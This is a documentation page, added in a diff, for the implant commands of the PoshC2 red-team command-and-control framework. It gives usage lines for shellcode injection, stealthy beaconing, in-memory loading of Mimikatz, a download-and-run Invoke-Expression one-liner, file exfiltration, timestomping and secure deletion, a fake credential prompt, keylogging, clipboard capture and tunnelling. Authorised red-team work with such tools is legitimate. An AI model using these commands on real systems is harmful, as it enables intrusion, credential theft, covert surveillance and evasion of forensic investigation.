@@ -1,0 +1,467 @@
+########
+Implants
+########
+
+Using an Implant
+####################
+The Implant-Handler window will not refresh the implant check-in times automatically, however, if you hit the [enter] key without any values in the input field it will refresh the implant window and update the last checked in times/dates. If you then wish to use one of the implants type the ID value and hit enter and this will put you into a prompt like follows ``1``::
+
+	PS 1>
+
+If you want to select more than one implant, you can provide a comma separated list ``1,2,3,4``::
+
+	PS 1,2,3>
+
+Finally, you can select ALL implants by typing ``ALL``::
+
+	PS ALL>
+
+StartAnotherImplant / S
+#########################
+Stability and redundancy is key, while we pride ourselves in the stability of PoshC2 implants it would always be in someone's best interest to maintain access when it may have taken significant time to obtain the foothold in the first instance. Born the ``StartAnotherImplant`` command and does exactly what it says in the help, it provides the user with another implant for redundancy. This command is quite long and has been aliased to a shorter form so can be ran using only ``S``. 
+
+This will by default start another "Powershell.exe" process, however, if you have migrated it will warn you before starting another implant as you may be trying to avoid using "Powershell.exe" at all because of monitoring systems checking for this execution. 
+
+.. code-block:: python
+
+	StartAnotherImplant
+
+.. code-block:: python
+
+	S
+
+Migrate
+###########
+If you want to migrate away from "Powershell.exe" to another process to main more stealth, run the ``migrate`` command. This will by default start a process of ``netsh.exe`` and inject the current implants shellcode automatically using the CreateRemoteThread call. If this fails, it will attempt to migrate using the RtlCreateUserThread WinAPI call.
+
+.. code-block:: python
+
+	Migrate
+
+Alternatively, if you want to inject separate shellcode, or different architecture you can do this with the following commands. Its worth noting that at present you can go from x64 -> x86 architecture but not back the other way. The only way to do this at present would be to call ``rundll32.exe Posh_x64.dll,VoidFunc`` with the x64 bit DLL dropped to disk:
+
+.. code-block:: python
+
+	Migrate -x64 -ProcID 444
+	Migrate -x64 -ProcessPath C:\Windows\System32\cmd.exe
+	Migrate -x86
+	Migrate-x64 -ProcID 4444
+	Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe
+	Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe
+	Migrate-Proxy-x86 -ProcID 4444
+	Migrate-Proxy-x64 -ProcID 444
+	Migrate-Daisy-x86 -Name DC1  -ProcID 444
+	Migrate-Daisy-x64 -Name DC2
+
+Inject-Shellcode
+####################
+This is also a key module but can be run from the core implant and can be supplied with a file containing shellcode. This is the underlining module that is called from the migrate command above, but instead if you run the ``-file`` parameter it will pop-up an explorer window for you to provide custom shellcode to the implant. 
+
+.. code-block:: python
+
+	Inject-Shellcode -File
+
+Beacon [seconds/minutes/hours]
+#########################################
+This is a simple command, but has a very significant place in Posh C2. It provides the user with the ability to change the 'beacon' time of the implant. Beacon time is the amount of time between each call home to the C2 server. The command can take parameters in seconds (``s``), minutes (``m``) or hours (``h``). 
+
+Setting the beacon time allows the user to achieve a certain amount of 'stealth', for instance to bypass or disguise the traffic against various C2 monitoring solutions. In addition to the user setting, there is a 10% jitter applied, this creates a random +/- time so the call back is never exactly the same each beacon.
+
+.. code-block:: python
+
+	Beacon 60s
+
+.. code-block:: python
+
+	Beacon 10m
+
+.. code-block:: python
+
+	Beacon 2h
+
+Turtle [seconds/minutes/hours]
+##############################
+Turtle is a similar function to the Beacon command, however in this case it tells the implant to go to sleep for a period of time, or as we like to refer to it as 'turtle mode'.
+
+This allows the user to be even more stealthy, for example a user may want the implant to stop calling home for a long period of time, maybe overnight or for 12 hours. The command can take parameters in seconds (``s``), minutes (``m``) or hours (``h``). 
+
+.. code-block:: python
+
+	Turtle 30m
+
+.. code-block:: python
+
+	Turtle 12h
+
+Kill-Implant
+###############
+This is a straight forward command to tell the implant to die and no longer connect back to the Posh C2 server. This command needs to be issued when interacting with the implant, it will not kill an implant otherwise. It is worth noting that in Powershell it will by default terminate the process, however, when migrating to another process it will only stop execution as we do not want to stop the entire PID. 
+
+.. code-block:: python
+
+	Kill-Implant
+
+Hide-Implant
+##############
+The ``Hide-Implant`` command is a partner to the above, Kill-Implant command. The reason for this command is the situation may arise where an implant may become disconnected or stale and there is no way to interact with it or to kill it. This command simply removes it from the list of implants to avoid possible confusion.
+
+.. code-block:: python
+
+	Hide-Implant
+
+Unhide-Implant
+################
+This does the reverse of the Hide-Implant, it re-adds any hidden implants into the active implant list.
+
+.. code-block:: python
+
+	Unhide-Implant
+	
+ListModules
+###############
+The ``ListModules`` command allows the user to view the Powershell modules that reside in the modules folder, within the PoshC2 folder tree. We have provided quiet a few Powershell modules that most of you will recognise such as Mimikatz and PowerUp, and some you will not have seen before. One of the nice features of PoshC2 is the ability for the user to create their own Powershell modules and use them within PoshC2. Simply copy the modules you want into the modules folder and you'll be able to load them into a running implant with the 'LoadModule' command, which is discussed further in this documentation.
+
+.. code-block:: python
+
+	ListModules
+
+LoadModule 
+#############
+As mentioned above, the LoadModules command allows a user to upload any PowerShell module into the memory space of the current implant, nothing touches disk, so we can evade non memory resident Anti-Virus. This will either search locally in the PoshC2 modules directory or can take a full path to a directory on the hard drive if this is outside the PoshC2 core modules folder.
+
+.. code-block:: python
+
+	LoadModule Invoke-Mimikatz.ps1
+
+.. code-block:: python
+
+	LoadModule C:\Temp\PS-Modules\Invoke-Mimikatz.ps1
+
+Loaded Module Externally
+########################
+To load a module directly from a webpage or github, you can use the Invoke-Expression function in Powershell to load this directly into memory if required.
+
+.. code-block:: python
+
+	Invoke-Expression (Get-Webclient).DownloadString("https://module.ps1")
+
+ModulesLoaded
+###############
+The ``ModulesLoaded`` command shows the user which Powershell modules has been loaded into the currently active implant, this is purely an informational command to see if you have loaded something previously.
+
+.. code-block:: python
+
+	ModulesLoaded
+
+CreateProxyPayload
+####################
+The ``CreateProxyPayload`` command was created to allow an implant to traverse an authenticated proxy when the implant is running under the SYSTEM account. Under normal circumstances the SYSTEM account shouldn't be authenticated on a domain level proxy server and pass through, so we created the CreateProxyPayload command to allow the attacker to provide a set of valid proxy credentials within the proxyurl and thus allows an implant to traverse any authenticated proxy server. We would use this technique when attempting lateral movement as well as privilege escalation techniques. 
+
+By default, this will create a new Bat file, standalone executable, service executable, 64bit DLL, 32bit DLL and Shellcode. The user and password parameters are optional and can be blank if needed. 
+
+.. code-block:: python
+
+	CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>
+
+**Parameters:**
+
+- **-proxyurl** http://10.0.0.1:8080 
+
+**Optional Parameters:**
+
+- **-user** dom\test 
+- **-pass** pass 
+
+CreateNewPayload
+####################
+This ``CreateNewPayload`` payload generates a number of new payloads that are setup to beacon to a different location. This is for when you are trying to remove attribution on various assets and you want some beaconing to different locations but to end up at the same PoshC2 instance. You would need to configure your C2 proxy servers to all come back to the same host. 
+
+By default, this will create a new Bat file, standalone executable, 64bit DLL, 32bit DLL and Shellcode. The user and password parameters are optional and can be blank if needed. 
+
+.. code-block:: python
+
+	CreateNewPayload -hostname https://hostname.com -domainfrontheader <url>
+
+**Parameters:**
+
+- **-hostname** https://www.c2.com 
+
+**Optional Parameters:**
+
+- **-domainfrontheader** blah.cloudfront.com 
+
+Invoke-DaisyChain
+####################
+The technique "Daisy Chaining" has been explained fully under the "Lateral Movement" section, however, if you want to setup the Daisy server you can with this command. This will create a new runspace in the current implant and run a Powershell proxy server that will redirect and PoshC2 traffic that comes onto that host. It is locked down to only accept connections from other PoshC2 URLs. In theory, there is no limit to how many layers you can pivot with this option. The "localhost" switch has been incorporated for if you want to only open this up on the localhost interface and use for escalation of privileges rather than using the CreateProxyPayload option. 
+
+By default, this will create a new Bat file, standalone executable, 64bit DLL, 32bit DLL and Shellcode. The user and password parameters are optional and can be blank if needed. 
+
+.. code-block:: python
+
+	Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)
+
+**Parameters:**
+
+- **-name** dc1daisy 
+- **-daisyserver** http://192.168.1.1 
+- **-port** 80 
+- **-c2port** 80 
+- **-c2server** http://c2.goog.com 
+- **-domfront** aaa.clou.com 
+
+**Optional Parameters:**
+
+- **-proxyurl** http://10.0.0.1:8080 
+- **-proxyuser** dom\test 
+- **-proxypassword** pass 
+- **-localhost** 
+
+.. embed:: https://www.youtube.com/watch?v=QzXnM7Vefzc
+
+Get-Proxy
+##########
+Here we provide a command that simply reports the IP address (if any) of the proxy server that the host implant is running on. This command gets the value from the user registry hive, ``HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings``
+
+.. code-block:: python
+
+	Get-Proxy
+
+Unzip 
+########
+Fairly straight forward command, it provides the user the ability to 'unzip a file', given the source and destination.
+
+.. code-block:: python
+
+	Unzip c:\Temp\zipped-exploit.zip C:\Temp\Exploit
+
+Download-File
+################
+Simply enter the path and name of the file to download, (copy back to the attackers system).
+
+.. code-block:: python
+
+ 	Download-File 'C:\Temp\Run Me.exe'
+
+Download-Files
+###############
+Simply enter the path of the folder to download, this will iteratively recurse through the files/folders and download each file individually. The files will end up in the downloads folder in the same folder structure as you downloaded them. 
+
+.. code-block:: python
+
+ 	Download-Files 'C:\Temp\'
+
+Upload-File
+#############
+
+In PoshC2, use the one liner with parameters:
+
+.. code-block:: python
+
+ 	Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'
+
+In PoshC2's Python version, use the questions asked by the Implant Handler:
+
+.. code-block:: python
+
+ 	Upload-File
+
+This is not considered the be Opsec safe for obvious reasons.
+
+Web-Upload-File
+#########################
+Here we have the option to upload a file to a victim system but this time we allow for the file to be copied from a remote web server. Again this command is not considered Opsec safe.
+
+.. code-block:: python
+
+ 	Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe'
+
+Get-Pid
+#########
+Returns the process ID of the implant from the database. This command does not go to the implant to retrieve this information:
+
+.. code-block:: python
+
+	Get-Pid
+
+Get-System
+############
+This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. 
+
+.. code-block:: python
+
+	Get-System
+
+Get-System-WithProxy
+#####################
+This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. This takes the "proxypayload" that will have been generated using CreateProxyPayload rather than a direct connection. 
+
+.. code-block:: python
+
+	Get-System-WithProxy
+ 	
+Get-System-WithDaisy
+#########################
+This is not an privilege escalation technique, this merely provides a SYSTEM level implant if you already have elevated rights but actually require a SYSTEM implant not user level. This takes the "daisypayload" that will have been generated using Invoke-DaisyChain rather than a direct connection. 
+
+.. code-block:: python
+
+	Get-System-WithDaisy
+ 	
+Get-ImplantWorkingDirectory
+#############################
+Returns the implant working directory from the database. This command does not go to the implant to retrieve this information:
+
+.. code-block:: python
+
+ 	Get-ImplantWorkingDirectory
+
+Posh-Delete 
+############
+This function creates a block of bytes in memory full of random content and overwrites the file with this before removing from disk. This option will help prevent forensic investigations against files that have been dropped to disk during the engagement, therefore is more OpSec aware. Please be aware this may take time on larger files. 
+
+.. code-block:: python
+
+ 	Posh-Delete C:\Temp\svc.exe
+
+Get-Webpage 
+############
+This returns a webpage in the form of HTML and appears in your downloaded content. This basically allows you to scrape basic HTML pages and render them client side without the need of invoking a SocksProxy or equivalent. 
+
+.. code-block:: python
+	
+	Get-Webpage http://intranet
+
+EnableRDP
+############
+This function enables RDP via the registry and enables the firewall rule associated. This must be run with elevated privileges otherwise it will fail as its changing registry values in HKLM.
+
+.. code-block:: python
+
+ 	EnableRDP
+
+DisableRDP
+############
+This function disables RDP via the registry and removes or disables the firewall rule associated if one was created. This must be run with elevated privileges otherwise it will fail as its changing registry values in HKLM.
+
+.. code-block:: python
+
+ 	DisableRDP
+
+TimeStomp 
+###########
+Time stomping has been around for many years and is an effective way of evading detection when an investigation has been started against the target. If an analyst is looking into newly created files or checking files in startup locations that have been written to for many years, this is a great deterrent. 
+
+.. code-block:: python
+
+ 	TimeStomp C:\Windows\System32\Service.exe "01/03/2008 12:12 pm"
+
+Get-Screenshot
+#########################
+Returns a screenshot of the users desktop, this **should** retrieve all valid desktops and monitors that are accessible to the users screen. 
+
+.. code-block:: python
+
+	Get-Screenshot
+
+Get-ScreenshotMulti
+#########################
+This function will run the Get-Screenshot command over a period of time provided and obtain multiple screenshots. This will enable the PoshC2 user to watch or monitor the users activity. 
+
+.. code-block:: python
+
+ 	Get-ScreenshotMulti -Timedelay 120 -Quantity 30
+
+Get-ScreenshotAllWindows
+#########################
+This function will loop through the active desktop windows and try to capture a screenshot, this will work if the window is be overlayed by another screen. This will not work if the window has been minimised. 
+
+.. code-block:: python
+ 	
+ 	Get-ScreenshotAllWindows
+
+Cred-Popper
+#########################
+This uses the Powershell to launch a Windows login prompt that pre-populates the users username and domain and asks that "Outlook" requires their credentials. This can be edited but it does not allow this on the command line. This then returns the entered credentials via the C2 channel. 
+
+.. code-block:: python
+
+ 	Cred-Popper
+
+Get-Clipboard
+#########################
+This uses "windows.forms.clipboard" to retrieve whatever value is in the clipboard, this could be used to capture passwords that have been copied and pasted. 
+
+.. code-block:: python
+
+ 	Get-Clipboard
+
+Get-AllFirewallRules
+#########################
+Using the COM object "HNetCfg.FwPolicy2" this retrieves the rules and dumps the information to CSV is supplied as a parameter. If no parameter is supplied it will show the results on screen. 
+
+.. code-block:: python
+
+ 	Get-AllFirewallRules C:\temp\rules.csv
+
+Get-AllServices
+#########################
+Using native Powershell this iteratively searches through "HKLM:\System\CurrentControlSet\services" to pull out the ImagePath and Description fields for all Windows services. 
+
+.. code-block:: python
+
+ 	Get-AllServices
+
+SocksProxy / SharpSocks
+#########################
+One of the most important tools for a Red Teamer is the SOCKS Proxy. This enables the creation of a tunnel between two machines such that any network traffic forwarded through it appears to have originated from the machine at the end of it. Once a foothold has been gained on a machine, a SOCKS proxy can be deployed between the operators machines and the target in order to access subnets, machines and services that would not normally be directly accessible. This includes being able to RDP to another machine or even to browse the corporate intranet.
+
+SOCKS support is built into most modern browsers and cURL. However, to use tools like rdesktop or nmap, proxychains on Linux can be used to tunnel the traffic. In order to simulate ProxyChains when using Windows, software such as ProxyCap (http://www.proxycap.com/) can be used.
+
+Previously, if a SOCKS was required then another implant, such as Meterpreter, would have to be deployed in order to provide the ability to tunnel TCP traffic into the internal network. We arrived at the decision that deploying a full implant just for SOCKS support is overkill and while e.g. Meterpreter is very good, it is also can be noisy and is not an appropriate representation of most sophisticated threat actors TTPs. Since PoshC2 is our publicly available C2, we wanted to add this ability for the wider world too, just like we have in our internal tooling.
+
+To deploy SharpSocks use the following command within PoshC2. This also has its own stand-alone module but has been integrated into PoshC2 to work seamlessly. Ensure you have fully configured your C2 proxy to forward traffic back to this host. 
+
+.. code-block:: python
+
+ 	SharpSocks -Uri http://www.c2.com:9090 -Beacon 2000 -Insecure
+
+.. embed:: https://www.youtube.com/watch?v=-p_hAgmM90k
+
+Get-Keystrokes
+#################
+Although this is an external module initially created in PowerShellMafia, we have changed the function to be in memory and not touch disk. `Get-Keystrokes.ps1 <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1>`_
+
+.. code-block:: python
+
+ 	Get-Keystrokes
+
+By default the keylogger will run for 60 minutes and to obtain the keylog output you must run:
+
+.. code-block:: python
+
+ 	Get-KeystrokesData
+
+Invoke-Runas
+#################
+The `Invoke-Runas` function was modified from the original work by `FuzzySecurity <https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1>`_ to work with PoshC2 and to create a primary token whether you run this from a user level perspective or SYSTEM. 
+
+This module has also been modified to not touch disk when executing. The options are shown below but payload types are discussed in more detail under lateral movement. This feature will allow you to impersonate another user and obtain a secondary implant as that user. 
+
+If running as Standard user - Args MAX Length is 1024 characters, leverages the following API call:
+
+.. code-block:: python
+
+	using Advapi32::CreateProcessWithLogonW
+
+If running as SYSTEM user - Args MAX Length is 32k characters, leverages the following API call:
+
+.. code-block:: python
+
+	Advapi32::LogonUser, Advapi32::DuplicateTokenEx, CreateProcessAsUser 
+
+.. code-block:: python
+
+ 	Invoke-RunasPayload -User <user> -Password '<pass>' -Domain <dom>
+	Invoke-RunasProxyPayload -User <user> -Password '<pass>' -Domain <dom>
+	Invoke-RunasDaisyPayload -User <user> -Password '<pass>' -Domain <dom>
+
